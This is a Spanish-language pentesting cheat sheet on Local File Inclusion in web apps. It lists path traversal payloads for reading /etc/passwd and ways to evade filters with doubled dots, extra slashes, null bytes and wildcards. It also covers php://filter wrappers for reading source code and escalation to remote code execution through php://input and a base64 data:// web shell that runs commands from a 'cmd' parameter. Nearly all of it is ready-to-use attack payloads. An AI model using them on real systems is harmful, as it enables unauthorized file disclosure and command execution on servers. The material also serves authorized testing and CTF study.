------
- tags: #web #lfi #burpsuite #pathtraversal #rce 
-------
Para ver ficheros interesantes, mirar [[Files]]

## Payloads

	/etc/passwd
	../../../../../../../../../../../../../etc/passwd

###### Si se remplaza "../" por "":
	....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

###### Si con expresiones regulares se evita /etc/passwd:
	/etc////////////passwd
	/etc/./././././././././passwd

###### Uso de wrappers para leer archivos php:
	?file=php://filter/convert.base64-encode/resource=index.php
	?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php

###### Si se fuerza a que el archivo acabe con una extensión concreta (ejemplo: .php):
Si la versión de php es inferior a la 5.3 podemos usar un null byte:

	/etc/passwd%00
	../../../../../../../etc/passwd%00

###### Si se fuerza a que los últimos 4 caracteres sean ".php" (Solo para versiones antiguas de php):
	/etc/passwd/.


###### SI el LFI se acontece por el comando "cat" ejecutado en el sistema podemos usar comodines:
	/etc/p?s?wd
	/???/passwd


### LFI ---> RCE

#### Log poisoning

Ver [[Files]]


###### php://input
Tendremos que cambiar la petición a POST. En la url poner:
	
	?file=php://input 

Y abajo del todo de la petición poner:

	<?php system("whoami"); ?>


###### data://
Tramitando la petición por GET, pondremos en la url:

	?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b

(La cadena contiene '<?php system($_GET["cmd"]); ?>' en base64)

A partir de ahi podremos ejecutar comandos de la siguiente manera:

	?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami





